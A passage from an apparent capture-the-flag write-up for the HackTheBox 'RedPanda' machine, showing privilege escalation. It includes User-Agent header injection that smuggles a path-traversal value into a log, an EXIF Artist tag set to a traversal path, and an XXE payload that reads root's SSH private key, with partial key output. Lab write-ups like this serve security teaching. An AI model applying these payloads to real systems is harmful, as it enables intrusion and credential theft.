So we don't care, we just need to have the path show up in the log, now if I just ask for it, it filters my path traversal attempt: 
```bash  
curl http://panda.htb:8080/../../../../../../../dev/shm/hamster.jpg
```
Shows up sanitized in the log 
```bash  
404||10.10.14.81||curl/7.85.0||/dev/shm/hamster.jpg
```

we know from the source that it just splits by the double pipes, so, since it logs the user agent first, we can just cheat, and do something like this : 

```bash
curl http://panda.htb:8080 -A "super hamster spy||../../../../../../../dev/shm/hamster.jpg"
```
And now it shows how we want it, and  
```bash
200||10.10.14.81||super hamster spy||../../../../../../../dev/shm/hamster.jpg||/
```

Ok, so at this stage we controll the artist variable, which means we can choose to read the report, from wherever we want, as long as it ends with `_creds.xml` so we can point it to /dev/shm
```bash
exiftool -Artist="../../../../../../dev/shm/privesc" hamster.jpg
    1 image files updated

```

And leverage an XXE to read root's private key
```bash
cat << EOF > /dev/shm/privesc_creds.xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>../../../../../../dev/shm/hamster.jpg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
EOF
```

Note that the exact artist in the jpg needs to match the exact path in the curl, that is the same number of dot dot slash too, because of this line:  
```java
if(el.getChild("uri").getText().equals(uri))
```
> (this stalled me for longer than necessary)

```bash
curl http://panda.htb:8080 -A "super hamster spy||../../../../../../../dev/shm/hamster.jpg"
```

When the cronjob hits, every 2 minutes, it will parse the existing xml at the path, and expand the external entity, here our private key, do the necessary changes in number of views to the xml, and write it back in the same place, which means that if we monitor it with watch we should see the private key appear after 2 min: 
```bash
Every 2.0s: cat privesc_creds.xml                                                                                                                                               redpanda: Sun Oct 16 19:09:39 2022

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <data>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
..............................SNIP....................................
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</data>
    <uri>/../../../../../../dev/shm/hamster.jpg</uri>
    <views>1</views>
  </image>
  <totalviews>3</totalviews>
</credits>
```

Done! That was fun
